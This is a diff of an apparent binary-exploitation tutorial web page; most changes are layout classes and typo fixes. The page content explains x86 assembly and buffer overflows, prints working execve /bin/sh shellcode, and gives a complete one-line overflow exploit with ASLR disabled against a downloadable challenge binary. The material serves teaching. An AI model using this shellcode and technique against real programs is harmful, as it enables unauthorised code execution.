@@ -84,17 +84,19 @@
                     <p class="left-margin">Software applications that can be effected either locally or remotely by outside users.
                         <br>Sections:</br>
                         <ul>
-                            <li>Tools</li>
-                            <li>x86 Assembly</li>
-                            <li>Buffer Overflows</li>
-                            <li>Shellcode</li>
-                            <li>Format Strings</li>
-                            <li>ROP: Return Oriented Programming</li>
-                            <li>Heap Exploitation</li>
+                            <li><a href="#binary-tools">Tools</a></li>
+                            <li><a href="#x86Assembly">x86 Assembly</a></li>
+                            <li><a href="#binary-buffer-overflow">Buffer Overflows</a></li>
+                            <li><a href="#binary-shellcode">Shellcode</a></li>
+                            <li><a href="#binary-format-strings">Format Strings</a></li>
+                            <li><a href="#binary-rop">ROP: Return Oriented Programming</a></li>
+                            <li><a href="#binary-heap">Heap Exploitation</a></li>
                         </ul>
                         <br>
                     </p>
-                    <button type="button" class="btn btn-success btn-lg center-block" onclick="location.href='#binary-exploit'">Exploit Some Binaries!</button>
+                    <a href="#binary-exploit" style="text-decoration: none;">
+                        <button type="button" class="btn btn-success btn-lg center-block">Exploit Some Binaries!</button>
+                    </a>
                 </div>
             </div>
             <div class="col-sm-4">
@@ -173,7 +175,7 @@
                 </div>
             </div>
         </div>
-        <div class="row bottom-pad" id="assembly">
+        <div class="row bottom-pad" id="x86Assembly">
             <h2 class="text-center bottom-pad"><b>x86 Assembly</b></h2>
             <h3 class="text-center">Global Variables</h3>
             <div class="col-sm-3 col-sm-offset-3">
@@ -210,8 +212,8 @@
                 <div class="container-fluid" style="padding: 0;">
                     <div class="row">
                         <div class="col-sm-8">
-                            <p>So what's going on here? Above are two snippets of code, the first is C code for a small program and the second is it's corresponding x86 assembly code. Let's take a look first at what our variables are in the C code and how they relate to the assembly code.</p>
-                            <p>The first three lines of C code declare some global variables, two int's and one float. However, the equivalent lines for x86 show that the variables are actualy stored at memory locations. Notice that each of the locations are offests of 4 from eachother. This is due to the fact that int's and floats take up 32-bits or 4 bytes each. The second thing to notice is that this is a hard memory address. Each time the binary is run, the variables will always be located at these exact addresses. Now to get into the actual main method.</p>
+                            <p>So what's going on here? Above are two snippets of code, the first is C code for a small program and the second is its corresponding x86 assembly code. Let's take a look first at what our variables are in the C code and how they relate to the assembly code.</p>
+                            <p>The first three lines of C code declare some global variables, two int's and one float. However, the equivalent lines for x86 show that the variables are actually stored at memory locations. Notice that the locations are offsets of 4 from each other. This is due to the fact that int's and floats take up 32-bits or 4 bytes each. The second thing to notice is that this is a hard memory address. Each time the binary is run, the variables will always be at these exact addresses. Now to get into the main method.</p>
                         </div>
                         <div class="col-sm-4">
                             <pre><code class="cpp">int a;
@@ -224,7 +226,7 @@ float c;</code></pre>
                     <div class="row">
                         <div class="col-sm-8">
                             <p>
-                                <br>The assignments in C are plain enough where <b>a = 10</b> and <b>b = 100</b>. It's a little different for x86. First, there are two syntaxs for x86 assembly (Intel and AT&amp;T). We'll be focusing on the Intel syntax. Now, onto the instructions.</p>
+                                <br>The assignments in C are plain enough where <b>a = 10</b> and <b>b = 100</b>. It's a little different for x86. First, there are two syntaxes for x86 assembly (Intel and AT&amp;T). We'll be focusing on the Intel syntax. Now, onto the instructions.</p>
                             <p>In Intel syntax, the source is on the right and the destination is on the left. The <b>movl</b> instruction moves 32-bits from the source to the destination. The first instruction moves <b>0xa</b> (10 in decimal) to the memory location <b>0x8049634</b> which is actually the location of the <b>a</b> variable. Now that memory location has a value of 0xa which is what our C code did. The next line is very similar, I'll let you figure out what it does.</p>
                         </div>
                         <div class="col-sm-4">
@@ -238,7 +240,7 @@ movl 0x8049638, 0x64</code></pre>
                         <div class="col-sm-8">
                             <p>
                                 <br>It's important to note that in x86, there are several general purpose registers that are used often: eax, ebx, ecx, and edx. For our purposes you can think of them as registers that are used to store values temporarily so that they can be used in operations such as addition or division.</p>
-                            <p><b>mov</b> is much like <b>movl</b>, but it is mostly used with registers rather than immediate values. In this case, the value stored in <b>0x8049634</b> or <b>a</b> is moved into <b>edx</b>. The same is done with <b>b</b> and <b>eax</b>. The <b>lea</b> instruction is an optimization trick by the compiler that bypasses the ALU and uses the address bus. The ['s are actually dereferences an address. Essentially, it loads the value of <b>edx</b> + <b>eax</b> into <b>eax</b> meaning <b>eax</b> = <b>eax</b> + <b>edx</b>. The final line moves <b>eax</b> into the location that <b>a</b> is stored at.</p>
+                            <p><b>mov</b> is much like <b>movl</b>, but it is mostly used with registers and not immediate values. In this case, the value stored in <b>0x8049634</b> or <b>a</b> is moved into <b>edx</b>. The same is done with <b>b</b> and <b>eax</b>. The <b>lea</b> instruction is an optimization trick by the compiler that bypasses the ALU and uses the address bus. The ['s are actually dereferences an address. Essentially, it loads the value of <b>edx</b> + <b>eax</b> into <b>eax</b> meaning <b>eax</b> = <b>eax</b> + <b>edx</b>. The last line moves <b>eax</b> into the location that <b>a</b> is stored at.</p>
                         </div>
                         <div class="col-sm-4">
                             <pre style="margin-top: 10%;"><code class="cpp">a = a + b;</code></pre>
@@ -256,7 +258,7 @@ mov 0x8049634, eax</code></pre></div>
                 <p>On the bottom left, there are x86 register names as well as the corresponding values in those registers. We've seen <b>eax</b> and <b>ebx</b> before, but what's <b>esp</b>? The <b>esp</b> is the <b>Stack Register</b>. It keeps track of where exactly we are on the stack in memory.</p>
                 <p>The stack is divided into sections of 4 bytes also known as a word. This means that each time the stack value changes it's by a multiple of 4. Take note, that the stack starts at high memory addresses and grows to low memory address. Our starting value here is at 0x10000 as shown in the bottom left. When we push what is in <b>eax</b> onto the stack, the value of the stack point is decremented by 4 because it is growing towards lower memory. Then when we pop <b>ebx</b>, it means that the value at the stack pointer is moved into the specified register (<b>ebx</b> in this case). Then, the memory that the location was taking up is deallocated by moving the pointer back a word.</p>
             </div>
-            <div class="col-sm-4 well mobile-margin-left mobile-margin-right">
+            <div class="col-sm-4 well  mobile-margin-left-small mobile-margin-right-small">
                 <div class="container-fluid" style="padding: 0;">
                     <div class="row">
                         <div class="col-sm-5 col-sm-offset-3 bottom-pad">
@@ -281,7 +283,7 @@ pop ebx</code></pre>
                 </div>
             </div>
         </div>
-        <div class="row bottom-pad" id="assembly">
+        <div class="row bottom-pad">
             <h3 class="text-center">Local Variables</h3>
             <div class="col-sm-3 col-sm-offset-2">
                 <pre><code class="cpp">  
@@ -313,13 +315,13 @@ pop ebx</code></pre>
         add [ebp-0xc], eax
         </code></pre>
             </div>
-            <div class="col-sm-1 well stack-loc mobile-margin-left mobile-margin-right">0x41273333 0x64 0xa ???? ???? ????</div>
+            <div class="col-sm-1 well stack-loc mobile-margin-left-small mobile-margin-right-small">0x41273333 0x64 0xa ???? ???? ????</div>
             <div class="col-sm-1 text-center">
                 <p style="font-size: 5.4em;">&rarr;</p>
             </div>
-            <div class="col-sm-1 well stack-loc mobile-margin-left mobile-margin-right">0x41273333 0x64 0x6e ???? ???? ????</div>
+            <div class="col-sm-1 well stack-loc mobile-margin-left-small mobile-margin-right-small">0x41273333 0x64 0x6e ???? ???? ????</div>
         </div>
-        <div class="row" id="assembly">
+        <div class="row">
             <div class="col-sm-6 col-sm-offset-3">
                 <div class="container-fluid" style="padding: 0;">
                     <div class="row">
@@ -353,8 +355,8 @@ movl [ebp-0x8], 0x64</code></pre>
             </div>
         </div>
         <h3 class="text-center">Local Variable Example</h3>
-        <div class="row bottom-pad mobile-margin-left-small mobile-margin-right-small">
-            <div class="col-sm-4 col-sm-offset-4 well">
+        <div class="row bottom-pad  ">
+            <div class="col-sm-4 col-sm-offset-4 well mobile-margin-left-small mobile-margin-right-small">
                 <div class="container-fluid" style="padding: 0;">
                     <div class="row">
                         <div class="col-sm-5 col-sm-offset-2 bottom-pad">
@@ -388,7 +390,7 @@ add [ebp-0xc], eax</code></pre>
                 </div>
             </div>
         </div>
-        <div class="row" id="assembly">
+        <div class="row">
             <h3 class="text-center">Function Frames and Calling Convention</h3>
             <div class="col-sm-3 col-sm-offset-3">
                 <pre><code class="cpp">
@@ -436,7 +438,7 @@ main:
     ret                     ;0x80483c6</code></pre>
             </div>
         </div>
-        <div class="row mobile-margin-left-small mobile-margin-right-small" id="assembly">
+        <div class="row">
             <div class="col-sm-6 col-sm-offset-3">
                 <div class="container-fluid" style="padding: 0;">
                     <div class="row">
@@ -472,7 +474,7 @@ call callee</code></pre>
             </div>
         </div>
         <h3 class="text-center">Calling Convention Example</h3>
-        <div class="row bottom-pad mobile-margin-left mobile-margin-right">
+        <div class="row bottom-pad mobile-margin-left-small mobile-margin-right-small">
             <div class="col-sm-6 col-sm-offset-3 well">
                 <div class="container-fluid" style="padding: 0;">
                     <div class="row">
@@ -519,11 +521,11 @@ main:
                 </div>
             </div>
         </div>
-        <div class="row bottom-pad bottom-pad mobile-margin-left-small mobile-margin-right-small" id="buffer-overflows">
+        <div class="row bottom-pad bottom-pad  " id="binary-buffer-overflow">
             <h2 class="text-center"><b>Buffer Overflows</b></h2>
             <h3 class="text-center">The Accident</h3>
-            <div class="container-fluid" style="padding: 0;">
-                <div class="row bottom-pad" id="assembly">
+            <div class="container-fluid mobile-margin-left-small mobile-margin-right-small" style="padding: 0;">
+                <div class="row bottom-pad">
                     <div class="col-sm-3 col-sm-offset-3">
                         <pre><code class="language-cpp">   
 
@@ -579,7 +581,7 @@ main:
                     <div class="col-sm-6 col-sm-offset-3">
                         <div class="container-fluid" style="padding: 0;">
                             <div class="row">
-                                <div class="col-sm-8">
+                                <div class="col-sm-8 mobile-margin-left-small mobile-margin-right-small">
                                     <p>We already know what the assembly does, so let's talk about what a buffer overflow is and why or how it can occur. Think back to how function frames work. If a function is called it pushes the address of the next instruction and then the prologue of the called function pushes the <b>ebp</b>. The other important factor is local variables. Remember that local variables are stored on the stack as offsets of the <b>ebp</b>. The combination of these two things is what can lead to a classic buffer overflow. Looking at C code, the basic example is allocating a local buffer with some amount of space and then over filling it. Find the flaw in the above code example and then try it below!</p>
                                 </div>
                                 <div class="col-sm-4">
@@ -594,7 +596,7 @@ main:
                 </div>
             </div>
             <h3 class="text-center">Overflow Example</h3>
-            <div class="row bottom-pad bottom-pad mobile-margin-left-small mobile-margin-right-small">
+            <div class="row bottom-pad mobile-margin-left-small mobile-margin-right-small">
                 <div class="col-sm-6 col-sm-offset-3 well">
                     <div class="container-fluid" style="padding: 0;">
                         <div class="row">
@@ -653,7 +655,7 @@ main:
                 </div>
             </div>
             <h3 class="text-center bottom-pad">Calling Things You Shouldn't</h3>
-            <div class="row mobile-margin-left mobile-margin-right">
+            <div class="row mobile-margin-left-small mobile-margin-right-small">
                 <div class="col-sm-4 col-sm-offset-3">
                     <p>I've gone ahead and modified the example that we had earlier. You'll see that the same vulnerability exists, but there is now an additional method called <b>notCalled()</b>. As the name states, the function is never called. That's where we come in. But how? How can you call a method that's not called? Wrack your brain a bit. Is there something from the x86 assembly we know of that controls where a program goes? That's right, the <b>eip</b>! It points to the address of the next instruction. If you look back at the last example for x86 you'll see that the <b>saved eip</b> gets overwritten by the local buffer and then we get a segfault when trying to go to the invalid locaiton.</p>
                     <p>So now that we have a goal, to control the <b>saved eip</b>, how do we go about doing it in a way that is useful to us. The first real step is to understand and dissect what the program does. Looking at the code, you can see that it will only accept two arguments and that the second argument is passed to the <b>mycpy</b>.</p>
@@ -688,8 +690,8 @@ void notCalled() {
 }</code></pre>
                 </div>
             </div>
-            <h3 class="text-center bottom-pad">Gathering Info</h3>
-            <div class="row mobile-margin-left mobile-margin-right">
+            <h3 class="text-center">Gathering Info</h3>
+            <div class="row mobile-margin-left-small mobile-margin-right-small">
                 <div class="col-sm-4 col-sm-offset-2">
                     <p>It's now time to introduce the first tool in our arsenal that'll be integral to breaking binaries by looking at the raw assembly, <b>objdump</b>. We can't tell just from the C code how the buffer is set up on the stack. We won't always have the C code to rely on either, so <b>objdump</b> will quickly become a close friend. Let's try it! Navigate to the directory that the overflow.o file is in. Run the command <b>objdump -D -M intel ./overflow.o | less</b>. The <b>-D</b> tells objdump to disassemble everything it can find and the <b>-M intel</b> tells it to disassemble into intel syntax rather than the default AT&amp;T syntax. The pipe to less just makes the output navigable in a vim format. If you don't know how to search type: <b>/search_term</b>. Since we identified the overflow in <b>mycpy()</b> lets search for it and look at what it's assembly is. We really only care about the <b>strcpy</b> function and where the buffers are. Remember that the calling convention for cdecl is to push the arguments to the stack before the function is called.</p>
                 </div>
@@ -699,7 +701,7 @@ void notCalled() {
                     </div>
                 </div>
             </div>
-            <div class="row mobile-margin-left mobile-margin-right">
+            <div class="row mobile-margin-left-small mobile-margin-right-small">
                 <div class="col-sm-4 col-sm-offset-2">
                     <p>We can see that there are two <b>push</b> instructions, one that does <b>push DWORD PTR [ebp+0x8]</b> and one that does <b>lea eax, [ebp-0xc]</b>. Which is our local buffer? You can actually tell in two different ways. The first being that the arguments are pushed on the stack in order from last to first meaning that the last push that happens before the function is called is actually the first argument. We know that <b>strcpy</b> moves from (dest, src) meaning the first arg is actually our local buffer. The second way to tell is that the first push to happen pushes the pointer to <b>ebp+0x8</b>. Really the only time an offset of <b>ebp</b> will be positive is when accessing a functions current parameters. Looking at the second push we see that it's a <b>lea</b> instruction meaning its getting a pointer to the location of <b>ebp-0xc</b>. Since <b>ebp-0xc</b> is an address in our current function frame that's where our local buffer is going to be.</p>
                     <p>To the right is a representation of what the stack would look like in this situation. Since the location of the buffer is <b>ebp-0xc</b> that means that we only need to fill <b>0xc</b> bytes amount of data (3 words) to reach the <b>ebp</b>. Then to overwrite the <b>Saved EBP</b> we only need 4 more bytes (1 word). I should mention we don't care about what we put in for the <b>Saved EBP</b> location because we won't need to rely on previous stack locations. The next 4 bytes is the value of <b>saved EIP</b>. This is where our <b>eip</b> will move to once the current function returns. What do you think this value should be? What would happen if we put in the address of the <b>notCalled()</b> function? To find the address of the <b>notCalled()</b> function we'll need to go back into our <b>objdump</b> and grab the address next to it. In my case it is <b>0x08048516</b> (for reference, the address of <b>mycpy()</b> is <b>0x0804849b</b>). Okay great, we know what our offset is and the value we want to overwrite the <b>Saved EIP</b> with, but how do we use any of this. We will now enter the awesome world of python.</p>
@@ -741,10 +743,10 @@ void notCalled() {
         <!-- 
         This is the terminal code for websocket docker
     <h3 class="text-center bottom-pad">Let's Try It Out!</h3>
-    <div class="row mobile-margin-left-small mobile-margin-right-small bottom-pad">
+    <div class="row   bottom-pad">
         <div class="col-sm-6 col-sm-offset-3 well" id="terminal"></div>
     </div> -->
-        <div class="row" id="shellcode">
+        <div class="row" id="binary-shellcode">
             <h2 class="text-center"><b>Shellcode</b></h1>
             <h3 class="text-center">What is it?</h2>
             <div class="container-fluid" style="padding: 0;">
@@ -766,7 +768,7 @@ void notCalled() {
                     </div>
                 </div>
                 <h3 class="text-center">Square One</h3>
-                <div class="row bottom-pad" id="assembly">
+                <div class="row mobile-margin-left-small mobile-margin-right-small bottom-pad">
                     <div class="col-sm-3 col-sm-offset-3">
                         <pre><code class="language-cpp">#include &lt;stdlib.h&gt;
 
@@ -787,7 +789,7 @@ main:
     int $0x80</code></pre>
                     </div>
                 </div>
-                <div class="row bottom-pad">
+                <div class="row mobile-margin-left-small mobile-margin-right-small bottom-pad">
                     <div class="col-sm-6 col-sm-offset-3">
                         <div class="container-fluid" style="padding: 0;">
                             <div class="row">
@@ -824,11 +826,11 @@ return val: eax</code></pre></div>
 mov $0x1, %eax
 int $0x80</code></pre></div>
                             </div>
-                            <div class="row">
+                            <div class="row mobile-margin-left-small mobile-margin-right-small">
                                 <pre><code class="x86asm hljs">080483db &lt;main&gt;:
- 80483db:       bb 00 00 00 00          mov    ebx,0x0
- 80483e0:       b8 01 00 00 00          mov    eax,0x1
- 80483e5:       cd 80                   int    0x80
+ 80483db:       bb 00 00 00 00               mov    ebx,0x0
+ 80483e0:       b8 01 00 00 00               mov    eax,0x1
+ 80483e5:       cd 80                        int    0x80
 </code></pre>
                             </div>
                             <div class="row">
@@ -866,11 +868,11 @@ al (Least Significant 8-bits): 1001 1000</code></pre>
 mov $0x1, %al
 int $0x80</code></pre></div>
                             </div>
-                            <div class="row">
+                            <div class="row mobile-margin-left-small mobile-margin-right-small">
                                 <pre><code class="x86asm hljs">080483db &lt;main&gt;:
- 80483db:       31 db                   xor    ebx,ebx
- 80483dd:       b0 01                   mov    al,0x1
- 80483df:       cd 80                   int    0x80
+ 80483db:       31 db                       xor    ebx,ebx
+ 80483dd:       b0 01                       mov    al,0x1
+ 80483df:       cd 80                       int    0x80
 </code></pre>
                             </div>
                             <div class="row">
@@ -882,7 +884,7 @@ int $0x80</code></pre></div>
                     </div>
                 </div>
                 <h3 class="text-center">Making Something Useful</h3>
-                <div class="row bottom-pad" id="assembly">
+                <div class="row mobile-margin-left-small mobile-margin-right-small bottom-pad">
                     <div class="col-sm-3 col-sm-offset-3">
                         <pre><code class="language-cpp">#include &lt;stdlib.h&gt;
 
@@ -915,7 +917,7 @@ main:
     int $0x80</code></pre>
                     </div>
                 </div>
-                <div class="row">
+                <div class="row mobile-margin-left-small mobile-margin-right-small">
                     <div class="col-sm-6 col-sm-offset-3">
                         <div class="container-fluid" style="padding: 0;">
                             <div class="row">
@@ -1014,7 +1016,7 @@ mov $0x0, %edx
                         </div>
                     </div>
                 </div>
-                <div class="row bottom-pad" id="assembly">
+                <div class="row  mobile-margin-left-small mobile-margin-right-small bottom-pad">
                     <div class="col-sm-2 col-sm-offset-3">
                         <pre><code class="language-cpp">.text
 .global main
@@ -1034,32 +1036,34 @@ main:
                     </div>
                     <div class="col-sm-4">
                         <pre><code class="x86asm hljs">080483db &lt;main&gt;:
- 80483db:       31 c0                   xor    eax,eax
- 80483dd:       b0 0b                   mov    al,0xb
- 80483df:       31 d2                   xor    edx,edx
- 80483e1:       52                      push   edx
- 80483e2:       68 2f 2f 73 68          push   0x68732f2f
- 80483e7:       68 2f 62 69 6e          push   0x6e69622f
- 80483ec:       89 e3                   mov    ebx,esp
- 80483ee:       52                      push   edx
- 80483ef:       53                      push   ebx
- 80483f0:       89 e1                   mov    ecx,esp
- 80483f2:       cd 80                   int    0x80
+ 80483db:       31 c0                           xor    eax,eax
+ 80483dd:       b0 0b                           mov    al,0xb
+ 80483df:       31 d2                           xor    edx,edx
+ 80483e1:       52                              push   edx
+ 80483e2:       68 2f 2f 73 68                  push   0x68732f2f
+ 80483e7:       68 2f 62 69 6e                  push   0x6e69622f
+ 80483ec:       89 e3                           mov    ebx,esp
+ 80483ee:       52                              push   edx
+ 80483ef:       53                              push   ebx
+ 80483f0:       89 e1                           mov    ecx,esp
+ 80483f2:       cd 80                           int    0x80
 
 
 
 </code></pre>
                     </div>
                 </div>
-                <div class="row bottom-pad">
+                <div class="row mobile-margin-left-small mobile-margin-right-small">
                     <div class="col-sm-6 col-sm-offset-3">
                         <p>We can see that there are no NULL bytes at all in our bytecode! Let's just quickly translate that into something that python could ouptut, here it is: <b>'\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'</b> (25 bytes). Now thatf we finally have our non-NULL byte shellcode, let's put it to use!</p>
                     </div>
                 </div>
                 <h3 class="text-center">Applying What You Know (shell_overflow)</h3>
-                <div class="row" id="shellcode-challenge">
-                    <div class="col-sm-4 col-sm-offset-4">
-                        <pre><code class="language-cpp">Stack dump:
+                <div class="row mobile-margin-left-small mobile-margin-right-small">
+                    <div class="container-fluid">
+                        <div class="row" id="shellcode-challenge">
+                            <div class="col-sm-4 col-sm-offset-4">
+                                <pre><code class="language-cpp">Stack dump:
 0xffffd120: 0xffffd3c5 (first argument)
 0xffffd11c: 0x08048599 (saved eip)
 0xffffd118: 0xffffd148 (saved ebp)
@@ -1082,18 +1086,18 @@ main:
 0xffffd0d4: 0x0804826c
 0xffffd0d0: 0xf7ffd000 (beginning of buffer)
 </code></pre>
-                    </div>
-                </div>
-                <div class="row">
-                    <div class="col-sm-6 col-sm-offset-3">
-                        <p>This output is from the shell_overflow challenge which can be downloaded <a href="../file_resources_overflow-4" download="shell_overflow.o">here</a>. To do this challenge easily, we're going to turn of ASLR (Address Space Layout Randomization) which randomizes the location of the stack. To disable ASLR you can use the command <b>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</b>. To re-enable ASLR you can use the command <b>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</b>. Now, every time you run this the addresses printed out on the left column will be the same.</p>
-                        <p>Play with the binary a bit and see what you can find out before continuing... or just keep reading I'm not the police. The label of <b>beginning of buffer</b> at address <b>0xffffd0d0</b> is the start of our input and the <b>saved eip</b> is at <b>0xffffd11c</b>. To get to the start of the <b>saved eip</b> is only <b>0xffffd11c - 0xffffd0d0</b> or <b>0x4c</b> (76) bytes. So now we're at the <b>saved eip</b>, but what do we want to do? There's no real place to go with this buffer overflow so our only option right now is to use shellcode.</p>
-                        <p>What should we do with our shellcode? Should we put it at the beginning, middle, or end of our input and what should we put for the value of the <b>saved eip</b>? That's right, we should put it at the beginning override the value of the <b>saved eip</b> with the location of the shellcode (What is this, dora the explorer)! Putting the shellcode at the beginning of the buffer will allow us to use the <b>0xffffd0d0</b> address as the beginning of the shellcode. Let's see what this looks like:</p>
-                    </div>
-                </div>
-                <div class="row" id="shellcode-challenge">
-                    <div class="col-sm-4 col-sm-offset-4">
-                        <pre><code class="language-cpp">./overflow-4 $(python -c "print  '\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'a'*51 + '\x80\xd0\xff\xff'")
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col-sm-6 col-sm-offset-3">
+                                <p>This output is from the shell_overflow challenge which can be downloaded <a href="../file_resources_overflow-4" download="shell_overflow.o">here</a>. To do this challenge easily, we're going to turn of ASLR (Address Space Layout Randomization) which randomizes the location of the stack. To disable ASLR you can use the command <b>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</b>. To re-enable ASLR you can use the command <b>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space</b>. Now, every time you run this the addresses printed out on the left column will be the same.</p>
+                                <p>Play with the binary a bit and see what you can find out before continuing... or just keep reading I'm not the police. The label of <b>beginning of buffer</b> at address <b>0xffffd0d0</b> is the start of our input and the <b>saved eip</b> is at <b>0xffffd11c</b>. To get to the start of the <b>saved eip</b> is only <b>0xffffd11c - 0xffffd0d0</b> or <b>0x4c</b> (76) bytes. So now we're at the <b>saved eip</b>, but what do we want to do? There's no real place to go with this buffer overflow so our only option right now is to use shellcode.</p>
+                                <p>What should we do with our shellcode? Should we put it at the beginning, middle, or end of our input and what should we put for the value of the <b>saved eip</b>? That's right, we should put it at the beginning override the value of the <b>saved eip</b> with the location of the shellcode (What is this, dora the explorer)! Putting the shellcode at the beginning of the buffer will allow us to use the <b>0xffffd0d0</b> address as the beginning of the shellcode. Let's see what this looks like:</p>
+                            </div>
+                        </div>
+                        <div class="row" id="shellcode-challenge">
+                            <div class="col-sm-4 col-sm-offset-4">
+                                <pre><code class="language-cpp">./overflow-4 $(python -c "print  '\x31\xc0\xb0\x0b\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + 'a'*51 + '\x80\xd0\xff\xff'")
 Stack dump:
 0xffffd0d0: 0xffffd300 (first argument)
 0xffffd0cc: 0xffffd080 (saved eip)
@@ -1118,39 +1122,48 @@ Stack dump:
 0xffffd080: 0x0bb0c031 (beginning of buffer)
 $ 
 </code></pre>
-                    </div>
-                </div>
-                <div class="row">
-                    <div class="col-sm-6 col-sm-offset-3">
-                        <p>We did it! We put our shellcode at the beginning of the input and then padded it with 51 bytes because it's 76 bytes to the <b>saved eip</b> and our shellcode is 25 bytes. Now we just add the 4 byte address of the beginning of our buffer and then we get a shell.</p>
-                        <p>More Challenges On Their Way!</p>
+                            </div>
+                        </div>
+                        <div class="row">
+                            <div class="col-sm-6 col-sm-offset-3">
+                                <p>We did it! We put our shellcode at the beginning of the input and then padded it with 51 bytes because it's 76 bytes to the <b>saved eip</b> and our shellcode is 25 bytes. Now we just add the 4 byte address of the beginning of our buffer and then we get a shell.</p>
+                                <p>More Challenges On Their Way!</p>
+                            </div>
+                        </div>
                     </div>
                 </div>
             </div>
-            <div class="row" id="format-strings">
+            <div class="row" id="binary-format-strings">
                 <h2 class="text-center"><b>Format Strings</b></h2>
                 <h3 class="text-center">Why Do They Exist?</h3>
-                <div class="row">
-                    <div class="col-sm-4 col-sm-offset-4">
-                        <pre><code class="cpp">
-                printf("Hello %s!\n", name);
-                printf(buf);
+                <div class="container-fluid mobile-margin-left-small mobile-margin-right-small">
+                    <div class="row">
+                        <div class="col-sm-4 col-sm-offset-4">
+                            <pre><code class="cpp">
+        printf("Hello %s!\n", name);
+        printf(buf);
             </code></pre>
+                        </div>
                     </div>
-                </div>
-                <div class="row">
-                    <div class="col-sm-6 col-sm-offset-3">
-                        <p>C and C++ have what are called <b>format strings</b>. Format strings are in the format of ("%s", var) where the var is some string. There are actually several other common and uncommon format specifiers: %s for strings, %c for chars, %d for decimals, %f for floats, %x for hex representation, and %n for writing to the variable. So where does the vulnerability come in? Look at the first line of code, we have a format specifier and a variable attached that the specifier will use. The second line has no specifier. It will simply print out whatever is in the variable.</p>
-                        <p>This poses a very big problem because what would happen if in the buf variable it contained a string that looked like this: "Format %d". This is actually also interpreted as a format string as well, but if you compare the two formats you'll see that the second is missing a variable to read from. The key is what we learned about the cdecl calling convention.</p>
-                        <p>When a function is called its parameters are pushed to the stack. But now the format string is missing a parameter, but C and C++ don't care about that. When a function like <b>printf</b> is called even if the format string doesn't have the correct parameters, it'll still look up the stack and use the value of where it believes the paramter to be. We can actually use this to leak values on the stack!</p>
+                    <div class="row">
+                        <div class="col-sm-6 col-sm-offset-3">
+                            <p>C and C++ have what are called <b>format strings</b>. Format strings are in the format of ("%s", var) where the var is some string. There are actually several other common and uncommon format specifiers: %s for strings, %c for chars, %d for decimals, %f for floats, %x for hex representation, and %n for writing to the variable. So where does the vulnerability come in? Look at the first line of code, we have a format specifier and a variable attached that the specifier will use. The second line has no specifier. It will simply print out whatever is in the variable.</p>
+                            <p>This poses a very big problem because what would happen if in the buf variable it contained a string that looked like this: "Format %d". This is actually also interpreted as a format string as well, but if you compare the two formats you'll see that the second is missing a variable to read from. The key is what we learned about the cdecl calling convention.</p>
+                            <p>When a function is called its parameters are pushed to the stack. But now the format string is missing a parameter, but C and C++ don't care about that. When a function like <b>printf</b> is called even if the format string doesn't have the correct parameters, it'll still look up the stack and use the value of where it believes the paramter to be. We can actually use this to leak values on the stack!</p>
+                        </div>
+                    </div>
+                    <div class="row">
+                        <div class="col-sm-6 col-sm-offset-3">
+                            <p></p>
+                        </div>
                     </div>
                 </div>
             </div>
-            <div class="row" id="rop">
+            <div class="row" id="binary-rop">
                 <h2 class="text-center"><b>ROP: Return Oriented Programming</b></h2>
                 <h3 class="text-center">Coming Soon!</h3>
             </div>
-            <div class="row" id="heap-exploit">
+            <div class="row" id="binary-heap">
                 <h2 class="text-center"><b>Heap Exploitation</b></h2>
                 <h3 class="text-center">I'm not great at heaps. Coming not so soon!</h3>
                 <h3 class="text-center">In the mean time, check out Shellphish's <a href="https://github.com/shellphish/how2heap">how2heap</a>.</h3>
